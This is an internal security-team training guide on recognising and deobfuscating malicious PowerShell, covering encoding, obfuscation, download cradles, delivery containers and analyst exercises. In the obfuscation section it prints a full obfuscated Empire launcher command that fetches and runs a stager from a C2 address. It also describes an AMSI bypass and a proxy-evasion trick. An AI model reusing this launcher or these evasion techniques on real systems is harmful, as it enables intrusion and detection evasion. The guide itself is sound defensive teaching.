# Analyzing Malicious PowerShell Commands

PowerShell is a command-line shell and scripting language based on the
.Net framework which is installed by default on Windows 7/2008 R2 and
later.  It is increasingly used in targeted attacks and commodity
malware and has many capabilities attractive to adversaries:

- It is a signed Windows binary and is rarely blocked in environments
- It can execute dynamic code downloaded from another system (or the
    Internet) and execute it in memory without ever touching disk
- It can interface with .Net & Windows APIs
- It has built-in encrypted remoting
- It blends in with regular administration work and is difficult to
    detect with traditional security tools

Let's review some basics and then see how we can recognize and analyze
malicious PowerShell commands:

- [PowerShell Basics](#powershell-basics)
- [Offensive Uses of PowerShell](#offensive-uses-of-powershell)
- [Analysis](#analysis)

## PowerShell Basics

Cmdlets are specific commands in the form of [verb]-[noun]:
 Get-Service, Get-Command, Get-ExecutionPolicy

Many cmdlets have aliases such as `gcm` --> `Get-Command` and `gci` -->
`Get-ChildItem`.  You can view all these with the `Get-Alias` cmdlet.

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image001.png)


Modules are used to add cmdlets.  PowerShell will automatically load
modules located in `$env:PSModulePath`.

To see your module path, type in the variable name and press enter:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image002.png)


You can make your own cmdlets and modules by creating functions with the
PowerShell language:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image003.png)


You can then import them with the Import-Module cmdlet so you can
tab-complete/call them from anywhere:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image004.png)


To see modules use 

```powershell
Get-Module -listavailable and Get-Module -all
```

Some cmdlets can be passed a "scriptblock" which is a collection of
commands and is declared with curly brackets { }:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image005.png)


PowerShell is an object-oriented language.  Objects are composed of:

| | |
|-|-|
|Methods|actions taken on an object|
|Properties|information about the state of
|Events|actions to monitor for an object|

To see all of these for a single object, use the **Get-Member** cmdlet.

In this example, I'm storing the Outlook process (an object) as variable
$o and then piping $o to the Get-Member cmdlet:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image006.png)


This shows the different methods, properties, and events associated with
the Outlook Process object.

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image007.png)


You can call an object method by using the format
<object>.<method>():

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image008.png)


Or you can show an object property by using the format
<object>.<property>:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image009.png)


And you can show all properties (here shortened to pr) by using a
wildcard (*):

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image010.png)


PowerShell uses the following operators:

### Comparison                        
`-eq`, `-ne`, `-gt`, `-lt`, `-le`, `-ge`, `-contains`, `-notcontains`, `-in`, `-notin`, `-like`, `-notlike`, `-match`

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image011.png)


### Boolean                               
`-and`, `-or`, `-not`, `-xor`

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image012.png)


### Type    
`-is`, `-isnot`, `-as`
              

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image013.png)


The pipe character passes along objects to the next command which allows
specific objects and properties to be filtered.  In this example, the
first command results in all processes, the second returns only unique
process names, the third selects only the first 5 results, and the last
selects only the Id and ProcessName properties.

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image014.png)


The `ForEach-Object` cmdlet (aliases are `foreach` and `%`) loops through
each result you pipe it and performs an action on it:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image015.png)


This can also be used in a script:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image016.png)


`Format-List` and `Format-Table` can be used to display results in list or
table format:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image017.png)


![](images/Analyzing%20Malicious%20PowerShell%20Commands/image018.png)


Help functions are available for all cmdlets:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image019.png)


For more detailed information use:

```powershell
Get-Help Get-Process -detailed
```
```powershell
Get-Help Get-Process -full
```

## Offensive Uses of PowerShell

These are some popular attack tools that utilize PowerShell:

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Empire](https://github.com/EmpireProject/Empire)
- [Cobalt Strike](https://www.cobaltstrike.com)

These tools and others frequently use the following PowerShell
capabilities as part of their offensive operations:

- [Encoding](#encoding)
- [Obfuscation](#obfuscation)
- [Downloading and Executing in Memory](#downloading-and-executing-in-memory)



### Encoding

There are hundreds of command variations that can be used to encode a
command using PowerShell, here are a few:

```powershell
Powershell -EncodedCommand cwB0AHIAaQBuAGcAZwBvAGUAcwBoAGUAcgBlAA==

Powershell -enc cwB0AHIAaQBuAGcAZwBvAGUAcwBoAGUAcgBlAA==

Powershell -e cwB0AHIAaQBuAGcAZwBvAGUAcwBoAGUAcgBlAA==
```

There are legitimate reasons to encode a PowerShell command, but since
it is used so often in malicious scripts we need to investigate further
when encoded commands are detected.

To encode a command in PowerShell:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image020.png)


To decode an encoded command:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image021.png)


Once a command is decoded, we can determine what it is trying to do.

Here I've taken an encoded command argument from an alert from FireEye
and put it in a text file so I can decode it:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image022.png)


The following command grabs the content of encoded.txt, decodes it, and
places the results in a file named decoded.txt:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image023.png)


Now we can see the commands being run by this Empire launcher script
which will download the stager from the attacker's machine, decrypt it,
and execute it in memory.

### Obfuscation

The use of obfuscation can prevent both tools and analysts from
recognizing malicious PowerShell commands.

Tools such as
[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
and [Obfuscated Empire](https://github.com/cobbr/ObfuscatedEmpire) can
be used to obscure the way PowerShell commands appear on the command
line producing output in logs and alerts such as the following:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image024.png)


To understand how to approach this, it helps to be familiar with the
tool being used.

Invoke-Obfuscation has several different methods that can be used to
obfuscate commands:

|Method|Description|
|-|-|
|Token|Concatenates and/or reorders strings, arguments, variables, commands, and whitespace|
|String|Concatenates, reorders, and/or reverses entire command|
|Encoding|Encodes entire command in ASCII, Hex, Octal, Binary, SecureString, BXOR, Special Characters, or whitespace|
|Launcher|Uses various launching techniques such as wmic, rundll32, mshta, clip, echo|

One, some, or all of the techniques can be used on commands to obscure
their meaning, their parent and grandparent processes, and the system
resources involved. 

The best place to start is by identifying one of the techniques you
think is being used and trying to reverse it.

For example, let's look at the command above:

- The first line tells us this is a PowerShell command, using a hidden window and IEX (Invoke-Expression)

- The many lines that follow have many occurrences of the characters ${QP} which is unusual.

- The last two lines show that all of these lines are split before they are piped to the foreach command... and one of the characters used to split with is "\${QP}"

[CyberChef](https://gchq.github.io/CyberChef) is the best way to start
chipping away at this...

First use the **Find & Replace** recipe to replace all the "\${QP}" instances with commas:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image025.png)


Now let's do the same thing with all the other characters being used to
split...

Since these are all single characters, we can replace them all together
using a regular expression (remember to escape the "-" with a "\\" ):

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image026.png)


Now we can see the output looks like hex characters.

So, next add the `From Hex` recipe (using comma as the delimiter)
which will translate every hex character to ASCII:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image027.png)


Now we can see the commands that were executed without obfuscation.

Here's another example, this command has been concatenated and some
characters have been replaced:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image028.png)


We can make this much more readable by doing some replacements of our
own--replacing the ' and + characters with nothing:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image029.png)


Just those two substitutions alone helps give us a better idea of what
the command is doing. 

But we can also use the replace function to reverse the substitutions
that the attacker made.

This line tells us what we need to substitute:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image030.png)


First convert the bytes to their character values:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image031.png)


Now we know we need to replace:

| | | |
|-|-|-|
|vs2|with|'|
|9U1|with|"|
|ga1|with|$|

And we can add it to our command to remove the rest of the obfuscation:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image032.png)


This next example is an obfuscated PowerShell command requiring multiple
steps of deobfuscation.

First, let's go over an example of a string that's been reordered with
the format operator (`-f`).

In this example, I've obfuscated the string "echo Hello!"

First, the string is split into 3 fractions:

```
echo Hello!  -->  'ec','ho He','llo!'         
```

There are three fractions: 0,1 and 2

Then the order is changed:
```
'ec','ho He','llo!'   -->  'ho He','llo!','ec'      
```

This is where the original order is specified:
```
{2}{0}{1} -f 'ho He','llo!','ec'            
```

which means put section 2 first, then section 0, then section 1

Now see how all the fractions get correctly assembled when we feed it to
PowerShell:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image033.png)


And when I use it as an argument, it gets executed:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image034.png)


This is the same thing that's happening in the long PowerShell command
in this alert, but on a larger scale:

```powershell
\"C:\\\\WIndOws\\\\sYsTEM32\\\\cMd.exE    /c \\\"set  IvZh=\^&(
\$SheLlID\[1\]+\$sHELLID\[13\]+\'x\') (
((\\\"{124}{151}{47}{21}{185}{8}{214}{133}{157}{63}{112}{38}{106}{190}{101}{153}{87}{5}{19}{216}{231}{49}{117}{156}{181}{183}{164}{123}{221}{222}{18}{175}{142}{27}{131}{22}{98}{223}{215}{195}{80}{97}{13}{120}{59}{53}{188}{37}{139}{168}{11}{204}{227}{0}{41}{169}{150}{148}{138}{165}{33}{193}{50}{51}{187}{17}{30}{85}{20}{96}{167}{43}{186}{207}{118}{46}{110}{34}{94}{224}{12}{103}{57}{73}{90}{100}{40}{226}{173}{1}{115}{68}{125}{225}{104}{166}{149}{71}{89}{130}{194}{102}{122}{99}{162}{16}{154}{170}{233}{136}{203}{74}{105}{119}{212}{228}{176}{155}{230}{35}{56}{191}{92}{60}{192}{198}{200}{83}{158}{75}{3}{202}{143}{72}{209}{24}{213}{28}{23}{14}{48}{111}{145}{7}{62}{77}{39}{159}{129}{91}{78}{113}{184}{109}{220}{107}{55}{70}{163}{144}{189}{205}{127}{61}{29}{121}{65}{6}{137}{160}{26}{179}{69}{236}{134}{240}{237}{196}{108}{42}{81}{126}{45}{141}{146}{36}{86}{135}{217}{32}{140}{58}{79}{44}{93}{132}{9}{232}{178}{95}{182}{171}{229}{201}{241}{161}{2}{4}{67}{10}{239}{219}{199}{116}{25}{64}{88}{82}{177}{234}{54}{147}{128}{31}{211}{66}{210}{15}{218}{84}{180}{197}{152}{174}{208}{238}{235}{206}{76}{114}{172}{52}\\\"-f
\'Ew-OBJecT
\',\'%\',\'et.p\',\'ynBS\[\',\'hp8hU;\',\'(Wind\',\'nB\',\'BI=(\',\'t
\',\'.0.1:\',\'nB\',\'h\',\'CI\',\'(8hU\',\'\[ynB_\]}\',\'ta.Le\',\'s;ynB\',\'=
\',\'c\',\'ows
\',\'XY\',\'OBje\',\'Wc\',\'ynBS\',\'ynB\',\'nBSEr+y\',\'ynBI\]+\',\'yn\',\',\',\'RynBS\[\',\'ynBP\',\'t\',\'U1Y=fh\',\'
8hU\',\'c\',\'B\',\'op\',\'n\',\'8\',\'+1)%\',\'(8h\',\'Net.\',\'hpCook\',\'nBK=\[SyS\',\'2\',\'p,fhpsession=\',\'exT.E\',\'New-\',\';\',\'W\',\';y\',\'nBwc.PRO\',\'X\',\'Ag\',\'.3\',\'H\]=ynB\',\'K\[\',\'Ge\',\'er=8\',\'-\',\'n\',\'O\',\'yn\',\'CLieNT;yn\',\'nBT);\',\'y\',\'BData\[4..\',\'y\',\'S,=V}H\',\'nBS\[y\',\'S\',\'yn\',\'J\',\'t\',\'S\',\'B_\],\',\'TA
(ynBIV+y\',\'BI\',\'nBI\]\',\'hUhttp://1\',\'Rs.\',\'ief\',\'Biv\',\'yn\',\'-\',\'Ro\',\'XbNpde5y\',\'0
\',\'yn\',\'B\',\'B\',\'BH=(ynBH+ynBS\[y\',\'K.Cou\',\'7.\',\'oDING\]::\',\'8h\',\';\',\'AdD\',\'.\',\'ynBAr\',\'yTEs\',\'ozilla/5\',\'K\',\'I.\',\'St18hU);y\',\'%{ynBJ\',\'hU\',\'\[ynB\',\'aDeRs.Add(f\',\'BS\[\',\'n\',\'ynBDxIS%{y\',\'Bu=\',\')%2\',\'nB\',\'oxI\',\'dDaTA(y\',\'6\',\'.T\',\'=(y\',

User\',\'(\',\'=\',\'
\',\'ynBw\',\'DOJ9\#0a\',\'h\',\'X\',\'A\',\'n\',\'D\',\'B\',\'0\',\'TeM.\',\'6\]}};yn\',\'cR/t\',\'5;0.\',\'S\',\'Y.AddREsS
\',\'t\',\'p);ynBs\',\'KA\',\'o8hU;\',\'B\',\'S\[\',\'n\',\'KI\',\'\];ynBd\',\'ynBPROx\',\'={\',\';\',\'C=\',\'Ha\',\'.\',\'S=\',\'S\[y\',\'4;
Triden\',\'NeT.Web\',\'BS\[yn\',\'256;y\',\'\[\',\'n/g\',\'G\',\'\[ynBH\],ynB\',\')\',\'=\',\'nBR\',\'y\',\'8\',\'WebPROXY\',\'0..\',\';ynBt\',\'K))xISIE\',\'Q6Xh2Pc\^&+fBA\',\'R\',\'k\',\'B\',\'=ynBdA\',\'980\',\'y\',\'jOin\',\'t/7.0\',\'U\',\';
rv:11.0\',\'56;yn\',\'c\',\'T\',\'XY
\',\'e\',\'ynBI\];\',\'M\',\'ynB_%ynB\',\'t\])%\',\'8hU\',\',ynB\',\'E\',\'He\',\'\[C\',\'256\',\'NLOA\',\';\',\'/\',\'yn\',\'.255xI\',\'U,ynBu)\',\'ynB_-B\',\'
ynBda\',\'eM\',\'\[\]\](\^&\',\'\]=\',\'ynBDa\',\'A=yn\',\'nBJ+y\',\'S\[ynBJ\]\',\'SYS\',\'D\',\'NT
6.1; \',\'m/WLJp\',\'nGtH\];\',\'W\',\'ynBI\],ynBS\',\'like
\',\'Ge\',\'HeA\',\'AS\',\'y\',\'U/\',\';ynBpROxY=N\',\'n\',\'=8hU\',\'nB_\]+yn\',\'WO\',\'5\',\'25\',\'tA\[0.\',\'ynBR\',\'nBH\])%25\',\'WC.\',\'
\',\'DaTa=ynBWC.DO\',\'B\',\'admi\')).rePlacE(\'xIS\',\[StriNg\]\[char\]124).rePlacE((\[char\]121+\[char\]110+\[char\]66),\[StriNg\]\[char\]36).rePlacE((\[char\]56+\[char\]104+\[char\]85),\[StriNg\]\[char\]39).rePlacE((\[char\]102+\[char\]104+\[char\]112),\[StriNg\]\[char\]34))
&&POWersHELl -WindoWsT  hiddeN   (   \^&( \" -f\'rI\',\'ABle\',\'VA\' )
( \'Xt\',\'Ex\*\')
).\\\\\\\"v\`ALUe\\\\\\\".\\\\\\\"InvOKEC\`oMm\`AND\\\\\\\".(\" -f
\'Ok\',\'PT\',\'inV\',\'ESCRi\').Invoke( (   \^&  (  \'  ) (
\'E\',\'nv:IvzH\'  ) ).\\\\\\\"v\`ALUE\\\\\\\" )\\\"\"
```

There are two steps required to deobfuscate this command:

1. Reverse the reordering of the fractions

2. Reverse the replacements

To reverse the reordering, first find the end of the reordering function
which is just before the replacements start:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image035.png)


Now copy and paste the entire reordering function into Notepad++ and
make sure it's all on one line:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image036.png)


Then paste the line in PowerShell and press Enter:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image037.png)


Now PowerShell displays everything in the correct order, but there are
still some characters we need to replace.

To reverse the replacements, repeat the previous step but this time pipe
the output into a file (`ordered.txt` for example)

Now set a variable ($o for example) equal to `Get-Content ordered.txt`,
then call the variable while adding on your replacements:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image038.png)


Now you have the actual PowerShell command being executed.

### Downloading and Executing in Memory

Also known as "cradles", there are several different techniques used to
download and execute a payload with PowerShell.

Here is an install script for the Chocolatey Package Manager being
downloaded from the Internet and run in memory:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image039.png)


And here is a script being downloaded from another server and run in
memory:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image040.png)


This technique can also be used to download binary files:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image041.png)


`Invoke-RestMethod` (`irm`) and `Invoke-WebRequest` (`iwr`) can also download
files from the Internet, but to get through the Bluecoat Proxies the
request must include a special string in the user agent string:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image042.png)


![](images/Analyzing%20Malicious%20PowerShell%20Commands/image043.png)


## Analysis

PowerShell is increasingly used to download files and execute them in
memory as part of a client side attack.  Then once a system is
compromised, PowerShell is also leveraged to perform C2, privilege
escalation, lateral movement, and persistence functions.  This section
will only focus on PowerShell uses for client side attacks which occurs
in the Delivery phase of the Kill Chain.

Common scenarios for delivering a malicious payload using PowerShell
involve the following components:

|Component|Description|
|-|-|
|A container for the malicious scripts|PDF (.pdf), Office doc (.doc, .ppt, .xls), HTA file (.hta), Shortcut (.lnk), Scriptlet (.sct), batch file (.bat), and others|
|The script used to call PowerShell|JavaScript, VBScript, batch script|
|A PowerShell command|Downloads and runs payload using encoded and/or obfuscated arguments|
|The payload|Empire agent, Cobalt Strike beacon, or other implant|

<br>

For complete analysis, we must identify:

|||
|-|-|
|[How does the container deliver the attack?](#how-does-the-container-deliver-the-attack)|exploit, macro, embedded OLE object?|
|[How do the PowerShell commands get called?](#how-do-the-powershell-commands-get-called)|JavaScript, VBScript?|
|[What do the PowerShell commands do?](#what-do-the-powershell-commands-do)|Download and start-process, download file and execute in memory, download and save file to disk?|
|[What is the payload?](#what-is-the-payload)|Empire agent, Cobalt Strike Beacon, other implant, ransomware?|

<br>

### How does the container deliver the attack

Macros require a user to click Enable Content:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image044.png)


Embedded objects require a user to click on the object:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image045.png)


Exploit requires a user to open the document:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image046.png)


PowerPoint CustomActions require the user to open a Slideshow which
launches an Embedded Object:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image047.png)


### How do the PowerShell commands get called

Here is VBScript calling PowerShell to download malicious files and make
changes to the registry:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image048.png)


This is Jscript being used with PowerShell to download and execute files
and modify the registry:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image049.png)


Here is a batch script calling PowerShell to download an executable:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image050.gif)


### What do the PowerShell commands do

This stage will require research, simulation, and trial and error.  If
you don't recognize a command, look it up.  If you don't understand what
it does, experiment with it in a safe environment such as the OOB
machines.

In most cases, it is easier to break up each component of the command
line by line and analyze each individually.

Here is an example using one of the Empire launcher scripts recently
detected by FireEye:

![](images/Analyzing%20Malicious%20PowerShell%20Commands/image051.png)


Here is what happens in each of these lines:

1. AMSI, the Anti-Malware Scan Interface, is bypassed

2. Disables 100Continue behavior for web requests

3. Creates new web client object as variable "$wc"

4. Creates user agent string as variable "$u"

5. Adds the user agent as a request header

6. Sets the proxy to the default proxy on the system

7. Sets network credentials to default network credentials

8. Converts an ASCII string (staging key) to bytes and stores in
    variable "$K"

9. Stores commands to decrypt data in the variable "$R"

10. Adds a session key to the request header as a cookie

11. Stores the C2 server address and URI path as variables "$ser" and
    "$t"

12. Downloads the file at the address and path and stores it in the
    variable "$Data"

13. Stores the first 4 characters in the file in the variable "$iv"

14. Stores the remaining characters in the file in the variable "$data"

15. Decrypts the downloaded data (the Empire stager) with the staging
    key, converts to ASCII, and executes it

### What is the payload

This will also require research and experimentation.  Sometimes you will
recognize the tool being used and know what payload is being
downloaded.  Other times you will need to search for characteristics and
specific details online to determine the payload.

If you can capture a sample of the payload for analysis on the OOB, that
helps tremendously.  If the attack happened recently, the payload may
still be hosted on the attacker's machine or website.

Even if you can't download a sample, many times you can still determine
the payload being used by combining all information available to
you--alerts, logs, artifacts, OSINT, simulations, etc.

## Exercises

Find the malicious PowerShell commands in the following files and try to
answer the questions for each file:

	/CSIRT/Sample-Files/Not-really-a-pdf.pdf.lnk

	/CSIRT/Sample-Files/universal-patch.hta

	/CSIRT/Sample-Files/Hardening_Script.sct


1. What is the container being used for each?

2. What is the scripting language being used to call each PowerShell command?

3. What is each PowerShell command attempting to do?

4. What domain/IP and port is each command attempting to contact?

5. What payload is most likely being downloaded for each of these?

6. What other TTPs do you observe being used?
